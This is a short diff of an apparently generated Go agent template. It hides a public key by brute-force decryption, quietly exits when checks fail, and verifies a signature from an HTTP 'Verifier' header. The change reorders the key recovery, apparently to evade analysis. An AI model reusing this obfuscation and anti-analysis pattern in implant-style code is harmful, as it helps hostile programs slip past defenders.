@@ -164,20 +164,7 @@ func main() {
 
 	for true {
 		const pubKeyPEM = "{{.Pubkey}}"
-		known := "{{.Prefix}}"
-		decoded, _ := base64.StdEncoding.DecodeString(string(pubKeyPEM))
-		decrypted := bruteforce(decoded, []byte(known))
-		PEMBlock, _ := pem.Decode(decrypted)
-		if PEMBlock == nil {
-			os.Exit(0)
-		}
-		if PEMBlock.Type != "PUBLIC KEY" {
-			os.Exit(0)
-		}
-		pubkey, err2 := x509.ParsePKIXPublicKey(PEMBlock.Bytes)
-		if err2 != nil {
-			os.Exit(0)
-		}
+		known := "khdagfhjgkadsf"
 
 		ran := rand.New(rand.NewSource(time.Now().UnixNano()))
 		rng := rand.New(ran)
@@ -219,6 +206,21 @@ func main() {
 		rawSignature := resp.Header.Get("Verifier")
 		//fmt.Println(rawSignature)
 		signature_bytes, _ := base64.StdEncoding.DecodeString(rawSignature)
+
+		known = "{{.Prefix}}"
+		decoded, _ := base64.StdEncoding.DecodeString(string(pubKeyPEM))
+		decrypted := bruteforce(decoded, []byte(known))
+		PEMBlock, _ := pem.Decode(decrypted)
+		if PEMBlock == nil {
+			os.Exit(0)
+		}
+		if PEMBlock.Type != "PUBLIC KEY" {
+			os.Exit(0)
+		}
+		pubkey, err2 := x509.ParsePKIXPublicKey(PEMBlock.Bytes)
+		if err2 != nil {
+			os.Exit(0)
+		}
 
 		err = rsa.VerifyPKCS1v15(pubkey.(*rsa.PublicKey), crypto.SHA256, hash_test[:], signature_bytes)
 
